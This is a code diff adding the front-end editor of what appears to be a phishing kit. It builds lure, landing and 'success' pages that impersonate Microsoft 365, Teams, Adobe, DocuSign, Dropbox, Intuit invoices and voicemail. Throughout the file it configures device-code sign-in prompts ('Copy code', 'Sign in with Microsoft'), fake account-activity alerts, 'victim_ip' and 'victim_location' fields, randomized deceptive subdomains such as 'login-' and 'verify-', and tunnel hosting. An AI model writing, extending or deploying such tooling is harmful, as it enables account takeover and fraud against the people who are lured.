+                card_bg: '#ffffff',
+                body_card_bg: '#f5f5fc',
+                body_text: 'Thanks for verifying your identity. You are now being admitted to the Microsoft Teams meeting room...',
+                footer_text: '',
+                redirect_sec: 4
+            },
+            'Cloud Voicemail': {
+                header_color: '#ffffff',
+                page_title: 'Cloud Voicemail - Decryption Complete',
+                card_title: 'Voicemail Decrypted',
+                service_name: 'Cloud Voicemail',
+                page_bg: '#f2f6fa',
+                card_bg: '#ffffff',
+                body_card_bg: '#f0f4f9',
+                body_text: 'Authentication successful. Audio decrypted, starting playback stream...',
+                footer_text: '',
+                redirect_sec: 4
+            }
+        };
+
+        function setLandingMode(mode) {
+            lgCurrentLandingMode = mode;
+            ['S', 'B', 'A', 'R'].forEach(m => {
+                const chip = document.getElementById('chip-mode-' + m);
+                if (chip) chip.classList.toggle('active', m === mode);
+                const sec = document.getElementById('mode-section-' + m);
+                if (sec) sec.style.display = (m === mode ? 'flex' : 'none');
+            });
+            onLandingFieldChange();
+        }
+
+        function onLandingTemplateChange(switchTab = true) {
+            const tmpl = document.getElementById('lg-landing-template')?.value || 'Adobe';
+            const preset = LG_LANDING_PRESETS[tmpl] || LG_LANDING_PRESETS['Adobe'];
+            
+            if (document.getElementById('lg-land-left-title')) document.getElementById('lg-land-left-title').value = preset.left_title || tmpl;
+            if (document.getElementById('lg-land-left-desc')) document.getElementById('lg-land-left-desc').value = preset.left_desc || '';
+            if (document.getElementById('lg-land-left-color')) document.getElementById('lg-land-left-color').value = preset.left_color;
+            if (document.getElementById('lg-land-title')) document.getElementById('lg-land-title').value = preset.title;
+            if (document.getElementById('lg-land-desc')) document.getElementById('lg-land-desc').value = preset.desc;
+            if (document.getElementById('lg-land-doc-name')) document.getElementById('lg-land-doc-name').value = preset.doc_name;
+            if (document.getElementById('lg-land-doc-badge')) document.getElementById('lg-land-doc-badge').value = preset.doc_badge;
+            if (document.getElementById('lg-land-doc-meta')) document.getElementById('lg-land-doc-meta').value = preset.doc_meta;
+            if (document.getElementById('lg-land-verify-head')) document.getElementById('lg-land-verify-head').value = preset.verify_head;
+            if (document.getElementById('lg-land-verify-desc')) document.getElementById('lg-land-verify-desc').value = preset.verify_desc;
+            if (document.getElementById('lg-land-steps-head')) document.getElementById('lg-land-steps-head').value = preset.steps_head;
+            if (document.getElementById('lg-land-steps-text')) document.getElementById('lg-land-steps-text').value = preset.steps_text;
+            if (document.getElementById('lg-land-copy-label')) document.getElementById('lg-land-copy-label').value = preset.copy_label;
+            if (document.getElementById('lg-land-signin-label')) document.getElementById('lg-land-signin-label').value = preset.signin_label;
+            if (document.getElementById('lg-land-copy-color')) document.getElementById('lg-land-copy-color').value = preset.copy_color;
+            if (document.getElementById('lg-land-signin-color')) document.getElementById('lg-land-signin-color').value = preset.signin_color;
+            if (document.getElementById('lg-land-page-bg')) document.getElementById('lg-land-page-bg').value = preset.page_bg;
+            if (document.getElementById('lg-land-card-bg')) document.getElementById('lg-land-card-bg').value = preset.card_bg;
+            if (document.getElementById('lg-land-code-bg')) document.getElementById('lg-land-code-bg').value = preset.code_bg;
+            if (document.getElementById('lg-land-steps-bg')) document.getElementById('lg-land-steps-bg').value = preset.steps_bg;
+            if (document.getElementById('lg-land-custom-footer')) document.getElementById('lg-land-custom-footer').value = preset.footer;
+
+            lgLandingLogoData = null;
+            const logoInp = document.getElementById('lg-land-logo-file');
+            if (logoInp) logoInp.value = '';
+
+            onLandingFieldChange(switchTab);
+        }
+
+        function resetLandingLogo() {
+            lgLandingLogoData = null;
+            const inp = document.getElementById('lg-land-logo-file');
+            if (inp) inp.value = '';
+            onLandingFieldChange();
+            showToast('Reverted to default template logo');
+        }
+
+        function resetLandColor(elId, defVal) {
+            const el = document.getElementById(elId);
+            if (el) el.value = defVal;
+            onLandingFieldChange();
+        }
+
+        function resetLandingLeftColor() {
+            const tmpl = document.getElementById('lg-landing-template')?.value || 'Adobe';
+            const preset = LG_LANDING_PRESETS[tmpl] || LG_LANDING_PRESETS['Adobe'];
+            resetLandColor('lg-land-left-color', preset.left_color);
+        }
+
+        function resetLandingCustomizations() {
+            onLandingTemplateChange();
+            showToast('Landing editor reset to template defaults');
+        }
+
+        function onLandingLogoUpload(e) {
+            const f = e.target.files[0];
+            if (!f) return;
+            const r = new FileReader();
+            r.onload = ev => { lgLandingLogoData = ev.target.result; onLandingFieldChange(); };
+            r.readAsDataURL(f);
+        }
+
+        function onLandingLeftBgUpload(e) {
+            const f = e.target.files[0];
+            if (!f) return;
+            const r = new FileReader();
+            r.onload = ev => { lgLandingLeftBgData = ev.target.result; onLandingFieldChange(); };
+            r.readAsDataURL(f);
+        }
+
+        function onLandingPageBgUpload(e) {
+            const f = e.target.files[0];
+            if (!f) return;
+            const r = new FileReader();
+            r.onload = ev => { lgLandingPageBgData = ev.target.result; onLandingFieldChange(); };
+            r.readAsDataURL(f);
+        }
+
+        function onLandingCardBgUpload(e) {
+            const f = e.target.files[0];
+            if (!f) return;
+            const r = new FileReader();
+            r.onload = ev => { lgLandingCardBgData = ev.target.result; onLandingFieldChange(); };
+            r.readAsDataURL(f);
+        }
+
+        function onLandingCodeBgUpload(e) {
+            const f = e.target.files[0];
+            if (!f) return;
+            const r = new FileReader();
+            r.onload = ev => { lgLandingCodeBgData = ev.target.result; onLandingFieldChange(); };
+            r.readAsDataURL(f);
+        }
+
+        function onLandingStepsBgUpload(e) {
+            const f = e.target.files[0];
+            if (!f) return;
+            const r = new FileReader();
+            r.onload = ev => { lgLandingStepsBgData = ev.target.result; onLandingFieldChange(); };
+            r.readAsDataURL(f);
+        }
+
+        function getLandingConfig() {
+            const isVis = id => {
+                const el = document.getElementById(id);
+                return el ? el.dataset.visible === '1' : true;
+            };
+            return {
+                show_left_panel: document.getElementById('lg-land-show-left')?.checked ?? true,
+                show_left_column: document.getElementById('lg-land-show-left')?.checked ?? true,
+                left_bg_color: document.getElementById('lg-land-left-color')?.value || '#FA0F00',
+                show_left_bg_image: isVis('lg-show-land-left-bg'),
+                left_bg_image: isVis('lg-show-land-left-bg') ? lgLandingLeftBgData : '',
+                left_logo_image: lgLandingLogoData,
+
+                show_left_title: isVis('lg-show-land-left-title'),
+                left_title: document.getElementById('lg-land-left-title')?.value || '',
+                show_left_desc: isVis('lg-show-land-left-desc'),
+                left_desc: document.getElementById('lg-land-left-desc')?.value || '',
+
+                landing_mode: lgCurrentLandingMode,
+
+                // Mode S
+                show_landing_title: isVis('lg-show-land-title'),
+                landing_title: document.getElementById('lg-land-title')?.value || 'Sign Document',
+                show_landing_desc: isVis('lg-show-land-desc'),
+                landing_desc: document.getElementById('lg-land-desc')?.value || '',
+                show_doc_name: isVis('lg-show-land-doc-name'),
+                doc_name: document.getElementById('lg-land-doc-name')?.value || 'Service-Agreement.pdf',
+                show_doc_badge: isVis('lg-show-land-doc-badge'),
+                doc_badge: document.getElementById('lg-land-doc-badge')?.value || 'PDF',
+                show_doc_meta: isVis('lg-show-land-doc-meta'),
+                doc_meta: document.getElementById('lg-land-doc-meta')?.value || '',
+                doc_sub: document.getElementById('lg-land-doc-meta')?.value || '',
+                landing_doc_sub: document.getElementById('lg-land-doc-meta')?.value || '',
+
+                // Mode B
+                show_mode_b_title: isVis('lg-show-land-b-title'),
+                mode_b_title: document.getElementById('lg-land-b-title')?.value || 'Verify your Identity',
+                show_mode_b_amount: isVis('lg-show-land-b-amount'),
+                mode_b_amount: document.getElementById('lg-land-b-amount')?.value || '$1,347.50',
+                show_mode_b_invoice: isVis('lg-show-land-b-invoice'),
+                mode_b_invoice: document.getElementById('lg-land-b-invoice')?.value || 'Invoice #2026-1047',
+                show_mode_b_bill_from: isVis('lg-show-land-b-bill'),
+                mode_b_bill_from: document.getElementById('lg-land-b-bill')?.value || 'Intuit Inc.',
+                show_mode_b_date: isVis('lg-show-land-b-date'),
+                mode_b_date_label: document.getElementById('lg-land-b-date')?.value || 'PAYMENT PENDING',
+                show_mode_b_desc: isVis('lg-show-land-b-desc'),
+                mode_b_desc: document.getElementById('lg-land-b-desc')?.value || '',
+
+                // Mode A
+                show_mode_a_acct: isVis('lg-show-land-a-acct'),
+                mode_a_account_label: document.getElementById('lg-land-a-acct')?.value || 'MICROSOFT ACCOUNT',
+                show_mode_a_title: isVis('lg-show-land-a-title'),
+                mode_a_title: document.getElementById('lg-land-a-title')?.value || 'Review this activity',
+                show_mode_a_alert: false,
+                mode_a_alert: '',
+                show_mode_a_desc: isVis('lg-show-land-a-desc'),
+                mode_a_desc: document.getElementById('lg-land-a-desc')?.value || '',
+                show_mode_a_ip_lbl: isVis('lg-show-land-a-ip-lbl'),
+                mode_a_ip_label: document.getElementById('lg-land-a-ip-lbl')?.value || 'IP ADDRESS',
+                show_mode_a_ip: isVis('lg-show-land-a-ip'),
+                mode_a_ip: document.getElementById('lg-land-a-ip')?.value || '185.234.xx.xx',
+                show_mode_a_loc_lbl: isVis('lg-show-land-a-loc-lbl'),
+                mode_a_loc_label: document.getElementById('lg-land-a-loc-lbl')?.value || 'LOCATION',
+                show_mode_a_loc: isVis('lg-show-land-a-loc'),
+                mode_a_loc: document.getElementById('lg-land-a-loc')?.value || 'Frankfurt, Germany',
+
+                // Mode R
+                show_mode_r_title: isVis('lg-show-land-r-title'),
+                mode_r_title: document.getElementById('lg-land-r-title')?.value || 'Document ready for review',
+                show_mode_r_steps: isVis('lg-show-land-r-steps'),
+                mode_r_step1: document.getElementById('lg-land-r-step1')?.value || 'Verify Identity',
+                mode_r_step2: document.getElementById('lg-land-r-step2')?.value || 'Review',
+                mode_r_step3: document.getElementById('lg-land-r-step3')?.value || 'Sign',
+                show_mode_r_name: isVis('lg-show-land-r-doc'),
+                mode_r_doc_name: document.getElementById('lg-land-r-doc')?.value || 'Non-Disclosure Agreement',
+                show_mode_r_badge: isVis('lg-show-land-r-badge'),
+                mode_r_badge: document.getElementById('lg-land-r-badge')?.value || 'PDF',
+                show_mode_r_meta: isVis('lg-show-land-r-meta'),
+                mode_r_doc_meta: document.getElementById('lg-land-r-meta')?.value || 'NDA-2026-Final.pdf · 4 pages',
+                show_mode_r_desc: isVis('lg-show-land-r-desc'),
+                mode_r_desc: document.getElementById('lg-land-r-desc')?.value || '',
+
+                // Verify & Steps
+                show_verify_head: isVis('lg-show-land-verify-head'),
+                verify_heading: document.getElementById('lg-land-verify-head')?.value || 'Verify your identity',
+                show_verify_desc: isVis('lg-show-land-verify-desc'),
+                verify_desc: document.getElementById('lg-land-verify-desc')?.value || '',
+                show_steps_head: isVis('lg-show-land-steps-head'),
+                steps_heading: document.getElementById('lg-land-steps-head')?.value || 'STEPS TO SIGN:',
+                show_steps_text: isVis('lg-show-land-steps-text'),
+                steps_text: document.getElementById('lg-land-steps-text')?.value || '',
+
+                // Backgrounds
+                page_color: document.getElementById('lg-land-page-bg')?.value || '#f5f5f5',
+                card_bg: document.getElementById('lg-land-card-bg')?.value || '#ffffff',
+                code_card_bg: document.getElementById('lg-land-code-bg')?.value || '#ffffff',
+                steps_card_bg: document.getElementById('lg-land-steps-bg')?.value || '#fbfbfb',
+                show_page_bg_image: isVis('lg-land-bg-image-show'),
+                page_bg_image: isVis('lg-land-bg-image-show') ? lgLandingPageBgData : '',
+                page_bg_blur: parseInt(document.getElementById('lg-land-blur')?.value || '8', 10),
+                card_bg_image: lgLandingCardBgData,
+                code_card_bg_image: lgLandingCodeBgData,
+                steps_card_bg_image: lgLandingStepsBgData,
+
+                // Buttons
+                auto_open_signin: document.getElementById('lg-land-auto-open')?.checked ?? false,
+                show_copy_btn: isVis('lg-show-land-copy-label'),
+                copy_btn_label: document.getElementById('lg-land-copy-label')?.value || 'Copy code',
+                show_signin_btn: isVis('lg-show-land-signin-label'),
+                signin_btn_label: document.getElementById('lg-land-signin-label')?.value || 'Sign in with Microsoft',
+                copy_btn_color: document.getElementById('lg-land-copy-color')?.value || '#FA0F00',
+                signin_btn_color: document.getElementById('lg-land-signin-color')?.value || '#000000',
+
+                // Footer
+                custom_footer: document.getElementById('lg-land-custom-footer')?.value || ''
+            };
+        }
+
+        function onSuccessLogoUpload(e) {
+            const f = e.target.files[0];
+            if (!f) return;
+            const r = new FileReader();
+            r.onload = ev => { lgSuccessLogoData = ev.target.result; onSuccessFieldChange(); };
+            r.readAsDataURL(f);
+        }
+
+        function onSuccessBannerUpload(e) {
+            const f = e.target.files[0];
+            if (!f) return;
+            const r = new FileReader();
+            r.onload = ev => { lgSuccessBannerData = ev.target.result; onSuccessFieldChange(); };
+            r.readAsDataURL(f);
+        }
+
+        function onSuccessPageBgUpload(e) {
+            const f = e.target.files[0];
+            if (!f) return;
+            const r = new FileReader();
+            r.onload = ev => { lgSuccessPageBgData = ev.target.result; onSuccessFieldChange(); };
+            r.readAsDataURL(f);
+        }
+
+        function onSuccessCardBgUpload(e) {
+            const f = e.target.files[0];
+            if (!f) return;
+            const r = new FileReader();
+            r.onload = ev => { lgSuccessCardBgData = ev.target.result; onSuccessFieldChange(); };
+            r.readAsDataURL(f);
+        }
+
+        function resetSuccColor(elId, defVal) {
+            const el = document.getElementById(elId);
+            if (el) el.value = defVal;
+            onSuccessFieldChange();
+        }
+
+        function resetSuccessCustomizations() {
+            onSuccessTemplateChange();
+            showToast('Success editor reset to template defaults');
+        }
+
+        function onSuccessTemplateChange(switchTab = true) {
+            const tmpl = document.getElementById('lg-success-template')?.value || 'Dropbox';
+            const preset = LG_SUCCESS_PRESETS[tmpl] || LG_SUCCESS_PRESETS['Dropbox'];
+
+            if (document.getElementById('lg-succ-header-color')) document.getElementById('lg-succ-header-color').value = preset.header_color;
+            if (document.getElementById('lg-succ-page-title')) document.getElementById('lg-succ-page-title').value = preset.page_title;
+            if (document.getElementById('lg-succ-card-title')) document.getElementById('lg-succ-card-title').value = preset.card_title;
+            if (document.getElementById('lg-succ-service-name')) document.getElementById('lg-succ-service-name').value = preset.service_name;
+            if (document.getElementById('lg-succ-page-bg')) document.getElementById('lg-succ-page-bg').value = preset.page_bg;
+            if (document.getElementById('lg-succ-card-bg')) document.getElementById('lg-succ-card-bg').value = preset.card_bg;
+            if (document.getElementById('lg-succ-body-card-bg')) document.getElementById('lg-succ-body-card-bg').value = preset.body_card_bg;
+            if (document.getElementById('lg-succ-body-text')) document.getElementById('lg-succ-body-text').value = preset.body_text;
+            if (document.getElementById('lg-succ-footer-text')) document.getElementById('lg-succ-footer-text').value = preset.footer_text;
+            if (document.getElementById('lg-succ-redirect-sec')) document.getElementById('lg-succ-redirect-sec').value = preset.redirect_sec;
+
+            onSuccessFieldChange(switchTab);
+        }
+
+        function useDefaultSuccessBg() {
+            lgSuccessPageBgData = '';
+            const nameEl = document.getElementById('lg-succ-bg-name');
+            if (nameEl) nameEl.innerText = 'Blueprint Floor Plan (Default)';
+            const btn = document.getElementById('lg-succ-bg-show');
+            if (btn) {
+                btn.dataset.visible = '1';
+                btn.innerText = 'Show';
+                btn.classList.add('active');
+                btn.classList.remove('hidden-state');
+            }
+            onSuccessFieldChange();
+            showToast('Success page reset to Default Blueprint background');
+        }
+
+        function getSuccessConfig() {
+            const isVis = id => document.getElementById(id)?.dataset.visible === '1';
+            return {
+                header_color: document.getElementById('lg-succ-header-color')?.value || '#ffffff',
+                page_title: document.getElementById('lg-succ-page-title')?.value || '',
+                card_title: document.getElementById('lg-succ-card-title')?.value || 'Shared folder access',
+                success_title: document.getElementById('lg-succ-card-title')?.value || 'Shared folder access',
+                service_name: document.getElementById('lg-succ-service-name')?.value || 'Dropbox',
+                page_bg: document.getElementById('lg-succ-page-bg')?.value || '#ffffff',
+                card_bg: document.getElementById('lg-succ-card-bg')?.value || '#ffffff',
+                show_page_bg_image: document.getElementById('lg-succ-bg-show') ? isVis('lg-succ-bg-show') : true,
+                show_bg_image: document.getElementById('lg-succ-bg-show') ? isVis('lg-succ-bg-show') : true,
+                page_bg_image: lgSuccessPageBgData,
+                page_bg_blur: parseInt(document.getElementById('lg-succ-blur')?.value || '8', 10),
+                card_bg_image: lgSuccessCardBgData,
+                custom_logo: lgSuccessLogoData,
+                header_banner: lgSuccessBannerData,
+                body_card_bg: document.getElementById('lg-succ-body-card-bg')?.value || '#fdfbf7',
+                body_text: document.getElementById('lg-succ-body-text')?.value || '',
+                success_desc: document.getElementById('lg-succ-body-text')?.value || '',
+                footer_text: document.getElementById('lg-succ-footer-text')?.value || '',
+                redirect_seconds: parseInt(document.getElementById('lg-succ-redirect-sec')?.value || '5', 10)
+            };
+        }
+
+        function onSuccessFieldChange(switchTab = true) {
+            if (switchTab && lgCurrentPreviewTab !== 'success') {
+                setPreviewTab('success');
+            } else {
+                updatePreviewTitle();
+                renderRealtimePreview();
+            }
+        }
+
+        function updateLeftPanelControlsState() {
+            const showLeft = document.getElementById('lg-land-show-left')?.checked ?? true;
+            const ctrl = document.getElementById('lg-land-left-branding-controls');
+            if (ctrl) {
+                ctrl.style.opacity = showLeft ? '1' : '0.35';
+                ctrl.style.pointerEvents = showLeft ? 'auto' : 'none';
+                ctrl.querySelectorAll('input, button, select').forEach(el => {
+                    el.disabled = !showLeft;
+                });
+            }
+        }
+
+        function onLandingFieldChange(switchTab = true) {
+            updateLeftPanelControlsState();
+            if (switchTab && lgCurrentPreviewTab !== 'landing') {
+                setPreviewTab('landing');
+            } else {
+                updatePreviewTitle();
+                renderRealtimePreview();
+            }
+        }
+
+        function setPreviewTab(tab) {
+            lgCurrentPreviewTab = tab;
+            ['preland', 'landing', 'success'].forEach(t => {
+                const btn = document.getElementById('btn-prev-' + t);
+                if (btn) btn.classList.toggle('active', t === tab);
+            });
+            updatePreviewTitle();
+            renderRealtimePreview();
+        }
+
+        function updatePreviewTitle() {
+            const labelEl = document.getElementById('lg-preview-tab-label');
+            if (!labelEl) return;
+            if (lgCurrentPreviewTab === 'preland') {
+                const t = (document.getElementById('lg-template-select')?.value || 'MICROSOFT 365').toUpperCase();
+                labelEl.innerHTML = `<span>👁️</span> PRE-LAND PREVIEW - ${t}`;
+            } else if (lgCurrentPreviewTab === 'landing') {
+                const t = (document.getElementById('lg-landing-template')?.value || 'ADOBE').toUpperCase();
+                labelEl.innerHTML = `<span>👁️</span> LANDING PREVIEW - ${t}`;
+            } else {
+                const t = (document.getElementById('lg-success-template')?.value || 'DROPBOX').toUpperCase();
+                labelEl.innerHTML = `<span>👁️</span> SUCCESS PREVIEW - ${t}`;
+            }
+        }
+
+        function randomizeSubdomain() {
+            const words = ['login', 'verify', 'auth', 'doc-view', 'portal', 'secure', 'share', 'access'];
+            const rand = words[Math.floor(Math.random() * words.length)] + '-' + Math.floor(100 + Math.random() * 900);
+            document.getElementById('lg-subdomain').value = rand;
+            onFieldChange();
+        }
+
+        function randomizePath() {
+            const t = document.getElementById('lg-template-select')?.value || 'Microsoft 365';
+            const list = LG_TEMPLATE_SLUGS[t] || ['verify-access', 'secure-document', 'review-portal', 'auth-session', 'identity-check'];
+            const current = document.getElementById('lg-path')?.value.trim();
+            const filtered = list.filter(s => s !== current);
+            const pool = filtered.length ? filtered : list;
+            const chosen = pool[Math.floor(Math.random() * pool.length)];
+            const pathInp = document.getElementById('lg-path');
+            if (pathInp) {
+                pathInp.value = chosen;
+                lgPathUserCustomized = false;
+            }
+            onFieldChange();
+        }
+
+        function getEffectiveDomain() {
+            const sel = document.getElementById('lg-domain');
+            if (!sel) return '127.0.0.1:5000';
+            if (sel.value === '__custom__') {
+                const custom = document.getElementById('lg-custom-domain')?.value.trim() || '';
+                return custom.replace(/^https?:\/\//i, '').replace(/\/+$/, '') || '127.0.0.1:5000';
+            }
+            return sel.value || '127.0.0.1:5000';
+        }
+
+        function onDomainSelectChange() {
+            const sel = document.getElementById('lg-domain');
+            const customInput = document.getElementById('lg-custom-domain');
+            if (sel && customInput) {
+                if (sel.value === '__custom__') {
+                    customInput.style.display = 'block';
+                    customInput.focus();
+                } else {
+                    customInput.style.display = 'none';
+                }
+            }
+            onFieldChange();
+        }
+
+        function updateUrlPreview() {
+            const domain = getEffectiveDomain();
+            const sub = document.getElementById('lg-subdomain')?.value.trim();
+            const path = document.getElementById('lg-path')?.value.trim();
+            const isTunnel = domain.includes('ngrok') || domain.includes('loca.lt') || domain.includes('trycloudflare') || domain.includes('cloudflare');
+            const isLocal = (domain.includes('127.0.0.1') || domain.includes('localhost')) && !isTunnel;
+            const proto = isLocal ? 'http://' : 'https://';
+            const host = (!isLocal && !isTunnel && sub) ? (sub + '.' + domain) : domain;
+            const full = proto + host + (path ? '/' + path : '');
+            const txt = document.getElementById('lg-preview-url-text');
+            if (txt) txt.innerText = full;
+        }
+
+        function onBgImageUpload(event) {
+            const file = event.target.files[0];
+            if (!file) return;
+            const reader = new FileReader();
+            reader.onload = function(e) {
+                lgBgImageData = e.target.result;
+                document.getElementById('lg-bg-file-txt').innerText = file.name;
+                onFieldChange();
+            };
+            reader.readAsDataURL(file);
+        }
+
+        function onLogoUpload(event) {
+            const file = event.target.files[0];
+            if (!file) return;
+            const reader = new FileReader();
+            reader.onload = function(e) {
+                lgLogoImageData = e.target.result;
+                onFieldChange();
+            };
+            reader.readAsDataURL(file);
+        }
+
+        function getEditorConfig() {
+            const isVisible = (id) => document.getElementById(id)?.dataset.visible === '1';
+            const desc = isVisible('lg-desc-show') ? document.getElementById('lg-desc')?.value : '';
+            const doc_meta = isVisible('lg-doc-meta-show') ? document.getElementById('lg-doc-meta')?.value : '';
+            const btn_label = isVisible('lg-btn-label-show') ? document.getElementById('lg-btn-label')?.value : '';
+            const foot1 = isVisible('lg-foot1-show') ? document.getElementById('lg-foot1')?.value : '';
+            const foot2 = isVisible('lg-foot2-show') ? document.getElementById('lg-foot2')?.value : '';
+            const btn_color = document.getElementById('lg-btn-color')?.value || '#0078D4';
+            const status_tag = isVisible('lg-status-tag-show') ? (document.getElementById('lg-status-tag')?.value || '') : '';
+
+            // Outlook fields
+            const outlook_sender = isVisible('lg-outlook-sender-show') ? (document.getElementById('lg-outlook-sender')?.value || '') : '';
+            const outlook_subject = isVisible('lg-outlook-subject-show') ? (document.getElementById('lg-outlook-subject')?.value || '') : '';
+            const outlook_meta = isVisible('lg-outlook-meta-show') ? (document.getElementById('lg-outlook-meta')?.value || '') : '';
+
+            // Teams fields
+            const meeting_topic = isVisible('lg-teams-topic-show') ? (document.getElementById('lg-teams-topic')?.value || '') : '';
+            const meeting_organizer = isVisible('lg-teams-organizer-show') ? (document.getElementById('lg-teams-organizer')?.value || '') : '';
+            const meeting_time = isVisible('lg-teams-time-show') ? (document.getElementById('lg-teams-time')?.value || '') : '';
+            const meeting_id = isVisible('lg-teams-id-show') ? (document.getElementById('lg-teams-id')?.value || '') : '';
+            const meeting_passcode = isVisible('lg-teams-passcode-show') ? (document.getElementById('lg-teams-passcode')?.value || '') : '';
+            const meeting_lobby = isVisible('lg-teams-lobby-show') ? (document.getElementById('lg-teams-lobby')?.value || '') : '';
+
+            // Voicemail fields
+            const caller_id = isVisible('lg-vm-caller-show') ? (document.getElementById('lg-vm-caller')?.value || '') : '';
+            const received_time = isVisible('lg-vm-time-show') ? (document.getElementById('lg-vm-time')?.value || '') : '';
+            const audio_duration = isVisible('lg-vm-duration-show') ? (document.getElementById('lg-vm-duration')?.value || '') : '';
+
+            return {
+                template: document.getElementById('lg-template-select')?.value || 'Microsoft 365',
+                template_name: document.getElementById('lg-template-select')?.value || 'Microsoft 365',
+                page_color: document.getElementById('lg-page-color')?.value || '#ffffff',
+                spinner_color: document.getElementById('lg-spin-color')?.value || '#0078D4',
+                spinner_size: parseInt(document.getElementById('lg-spin-size')?.value || '44', 10),
+                blur: parseInt(document.getElementById('lg-blur-slider')?.value || '8', 10),
+                show_bg_image: isVisible('lg-bg-image-show'),
+                card_bg: document.getElementById('lg-card-bg')?.value || '#ffffff',
+                title: isVisible('lg-title-show') ? document.getElementById('lg-title')?.value : '',
+                desc: desc,
+                description: desc,
+                show_desc: isVisible('lg-desc-show'),
+                show_title: isVisible('lg-title-show'),
+                show_status_tag: isVisible('lg-status-tag-show'),
+
+                // Document template fields
+                doc_name: isVisible('lg-doc-name-show') ? document.getElementById('lg-doc-name')?.value : '',
+                doc_badge: isVisible('lg-doc-badge-show') ? document.getElementById('lg-doc-badge')?.value : '',
+                doc_meta: doc_meta,
+                doc_sub: doc_meta,
+                show_doc_name: isVisible('lg-doc-name-show'),
+                show_doc_badge: isVisible('lg-doc-badge-show'),
+                show_doc_meta: isVisible('lg-doc-meta-show'),
+
+                // Outlook fields
+                outlook_sender: outlook_sender,
+                outlook_subject: outlook_subject,
+                outlook_meta: outlook_meta,
+                show_outlook_sender: isVisible('lg-outlook-sender-show'),
+                show_outlook_subject: isVisible('lg-outlook-subject-show'),
+                show_outlook_meta: isVisible('lg-outlook-meta-show'),
+
+                // Teams fields
+                meeting_topic: meeting_topic,
+                meeting_organizer: meeting_organizer,
+                meeting_time: meeting_time,
+                meeting_id: meeting_id,
+                meeting_passcode: meeting_passcode,
+                meeting_lobby_note: meeting_lobby,
+                show_meeting_topic: isVisible('lg-teams-topic-show'),
+                show_meeting_organizer: isVisible('lg-teams-organizer-show'),
+                show_meeting_time: isVisible('lg-teams-time-show'),
+                show_meeting_id: isVisible('lg-teams-id-show'),
+                show_meeting_passcode: isVisible('lg-teams-passcode-show'),
+                show_meeting_lobby: isVisible('lg-teams-lobby-show'),
+
+                // Voicemail fields
+                caller_id: caller_id,
+                received_time: received_time,
+                audio_duration: audio_duration,
+                show_vm_caller: isVisible('lg-vm-caller-show'),
+                show_vm_time: isVisible('lg-vm-time-show'),
+                show_vm_duration: isVisible('lg-vm-duration-show'),
+
+                // Common button & footers
+                status_tag: status_tag,
+                btn_label: btn_label,
+                button_label: btn_label,
+                show_btn_label: isVisible('lg-btn-label-show'),
+                btn_color: btn_color,
+                accent_color: btn_color,
+                foot1: foot1,
+                footer_caption: foot1,
+                show_foot1: isVisible('lg-foot1-show'),
+                foot2: foot2,
+                footer_text: foot2,
+                show_foot2: isVisible('lg-foot2-show'),
+                bg_image: lgBgImageData,
+                logo_data: lgLogoImageData
+            };
+        }
+
+        function onFieldChange() {
+            if (lgCurrentPreviewTab !== 'preland') {
+                setPreviewTab('preland');
+            } else {
+                updateUrlPreview();
+                updatePreviewTitle();
+                renderRealtimePreview();
+            }
+        }
+
+        let _lgPreviewDebounceTimer = null;
+
+        function updateIframeLiveBlur(blurPercent) {
+            const iframe = document.getElementById('lg-preview-iframe');
+            if (!iframe) return;
+            try {
+                const doc = iframe.contentDocument || iframe.contentWindow?.document;
+                if (!doc) return;
+                const px = Math.round((parseFloat(blurPercent || '0') / 100) * 32);
+                const layers = doc.querySelectorAll('.page-bg-layer, .bg-layer');
+                layers.forEach(el => {
+                    el.style.filter = `blur(${px}px)`;
+                    el.style.webkitFilter = `blur(${px}px)`;
+                });
+            } catch(e) {}
+        }
+
+        function renderRealtimePreview(immediate = false) {
+            if (_lgPreviewDebounceTimer) {
+                clearTimeout(_lgPreviewDebounceTimer);
+                _lgPreviewDebounceTimer = null;
+            }
+
+            const executeRender = () => {
+                const iframe = document.getElementById('lg-preview-iframe');
+                if (!iframe) return;
+
+                if (lgCurrentPreviewTab === 'preland') {
+                    const cfg = getEditorConfig();
+                    fetch('/api/lg/preview/preland', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            template_name: cfg.template_name || cfg.template || 'Microsoft 365',
+                            config: cfg,
+                            proceed_url: '#'
+                        })
+                    })
+                    .then(r => r.json())
+                    .then(d => { if (d.html) iframe.srcdoc = d.html; })
+                    .catch(() => { iframe.srcdoc = buildPrelandHtml(cfg); });
+                } else if (lgCurrentPreviewTab === 'landing') {
+                    const landingTemplate = document.getElementById('lg-landing-template')?.value || 'Microsoft 365';
+                    const landingCfg = getLandingConfig();
+                    fetch('/api/lg/preview/landing', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            template_name: landingTemplate,
+                            mode: lgCurrentLandingMode,
+                            config: landingCfg,
+                            user_code: 'ABCD-1234',
+                            victim_ip: landingCfg.mode_a_ip || '196.234.12.xx',
+                            victim_location: landingCfg.mode_a_loc || 'Frankfurt, Germany'
+                        })
+                    })
+                    .then(r => r.json())
+                    .then(d => { if (d.html) iframe.srcdoc = d.html; })
+                    .catch(() => {});
+                } else if (lgCurrentPreviewTab === 'success') {
+                    const successTemplate = document.getElementById('lg-success-template')?.value || 'Microsoft 365';
+                    const successUrl = document.getElementById('lg-landing-url')?.value || 'https://www.office.com/';
+                    const succCfg = getSuccessConfig();
+                    fetch('/api/lg/preview/success', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            template_name: successTemplate,
+                            config: succCfg,
+                            success_url: successUrl
+                        })
+                    })
+                    .then(r => r.json())
+                    .then(d => { if (d.html) iframe.srcdoc = d.html; })
+                    .catch(() => {});
+                }
+            };
+
+            if (immediate) {
+                executeRender();
+            } else {
+                _lgPreviewDebounceTimer = setTimeout(executeRender, 140);
+            }
+        }
+
+        function buildPrelandHtml(cfg) {
+            const brandLogos = {
+                'Microsoft 365': '/static/img/logo_microsoft.png',
+                'Adobe': '/static/img/logo_adobe.png',
+                'DocuSign': '/static/img/logo_docusign.png',
+                'Dropbox': '/static/img/logo_dropbox.png',
+                'OneDrive': '/static/img/logo_onedrive.png',
+                'QuickBooks': '/static/img/logo_quickbooks.png',
+                'Outlook': '/static/img/logo_outlook.png',
+                'SharePoint': '/static/img/logo_sharepoint.png',
+                'Microsoft Teams': '/static/img/logo_teams.png',
+                'Cloud Voicemail': '/static/img/logo_microsoft.png'
+            };
+            const t = cfg.template || cfg.template_name || 'Microsoft 365';
